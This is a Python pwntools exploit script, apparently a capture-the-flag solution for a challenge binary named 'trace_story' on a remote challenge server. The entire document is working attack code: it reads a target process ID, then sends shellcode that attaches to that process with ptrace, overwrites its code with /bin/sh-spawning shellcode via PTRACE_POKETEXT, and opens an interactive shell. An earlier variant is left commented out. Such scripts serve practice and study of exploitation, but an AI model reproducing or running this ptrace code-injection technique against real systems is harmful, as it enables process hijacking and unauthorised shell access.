from pwn import * 

# p = process('./trace_story')
p = remote('0.cloud.chals.io', 15148)
e = context.binary = ELF('./trace_story')

p.recvuntil(b'pid: ')
pid = int(p.recvline()[:-1])
print(pid)

addr = 0x401789
t1 = e.bss() + 0x100
t2 = e.bss() + 0x200
binsh = asm(shellcraft.sh())

# ans1
# payload = ""
# payload += "loop:"
# payload += shellcraft.ptrace(constants.linux.PTRACE_ATTACH, pid, 0, 0)

# for i in range(len(binsh)//8):
#     payload += shellcraft.ptrace(constants.linux.PTRACE_POKETEXT, pid, addr+i*8, u64(binsh[i*8:(i+1)*8]))

# payload += shellcraft.ptrace(constants.linux.PTRACE_DETACH, pid, 0, 0)
# payload += "jmp loop"

# ans2
payload = ''
payload += shellcraft.ptrace(constants.linux.PTRACE_ATTACH, pid, 0, 0)
payload += f'''
mov rdi, {t1}
xor rsi, rsi
mov rax, {constants.SYS_gettimeofday}
syscall
mov r14, [rdi]

loop:
mov rdi, {t2}
mov rax, {constants.SYS_gettimeofday}
syscall
mov r15, [rdi]
sub r15, r14
je loop
'''

for i in range(len(binsh)//8):
    payload += shellcraft.ptrace(constants.linux.PTRACE_POKETEXT, pid, addr+i*8, u64(binsh[i*8:(i+1)*8]))

payload += shellcraft.ptrace(constants.linux.PTRACE_DETACH, pid, 0, 0)

p.sendlineafter(b'Input:', asm(payload))

p.interactive()
